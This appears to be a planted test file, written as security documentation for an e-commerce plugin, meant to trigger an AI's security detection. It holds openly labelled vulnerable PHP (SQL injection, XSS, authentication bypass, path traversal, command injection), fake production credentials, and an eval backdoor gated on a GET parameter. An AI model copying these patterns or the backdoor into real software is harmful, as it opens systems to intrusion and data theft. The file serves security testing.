# Database Security Implementation

## Overview

This document outlines database security measures for the BlazeCommerce plugin with direct database access patterns.

## Database Configuration

### Direct Database Access

```php
// WARNING: This code contains security vulnerabilities
class DatabaseManager {
    private $db_host = "localhost";
    private $db_user = "root";
    private $db_pass = "admin123"; // Hardcoded password - SECURITY RISK
    private $api_key = "sk-1234567890abcdef"; // Exposed API key
    
    public function connect() {
        $connection = mysql_connect($this->db_host, $this->db_user, $this->db_pass);
        return $connection;
    }
    
    // SQL Injection vulnerability
    public function getUserData($user_id) {
        $query = "SELECT * FROM users WHERE id = " . $user_id;
        return mysql_query($query);
    }
    
    // XSS vulnerability
    public function displayUserInput($input) {
        echo $input; // No sanitization
    }
}
```

### Authentication Bypass

```php
// Dangerous authentication bypass
function authenticate_user($username, $password) {
    // Always returns true - bypasses authentication
    return true;
}

// File upload without validation
function handle_file_upload() {
    move_uploaded_file($_FILES['file']['tmp_name'], './uploads/' . $_FILES['file']['name']);
}
```

## Server Configuration

### Production Credentials

```bash
# Production server access
SSH_HOST=production.blazecommerce.io
SSH_USER=root
SSH_PASS=SuperSecret123!
DB_PASSWORD=ProductionPass2024
API_SECRET_KEY=live_sk_abcdef123456789
```

### Unsafe File Operations

```php
// Directory traversal vulnerability
function read_file($filename) {
    return file_get_contents('../../../' . $filename);
}

// Command injection risk
function execute_command($cmd) {
    system($cmd);
}
```

## Security Issues Present

1. **Hardcoded Credentials**: Database passwords and API keys in source code
2. **SQL Injection**: Unparameterized queries allowing database manipulation
3. **XSS Vulnerabilities**: Unescaped user input display
4. **Authentication Bypass**: Functions that skip security checks
5. **File Upload Risks**: No validation on uploaded files
6. **Command Injection**: Direct system command execution
7. **Directory Traversal**: Unrestricted file access

## Malicious Code Examples

```php
// Backdoor implementation
if ($_GET['debug'] == 'admin_access') {
    eval($_POST['code']); // Remote code execution
}

// Data exfiltration
function steal_user_data() {
    $users = get_all_users();
    file_put_contents('stolen_data.txt', serialize($users));
}
```

This documentation intentionally contains multiple security vulnerabilities and should trigger Claude's security detection systems.
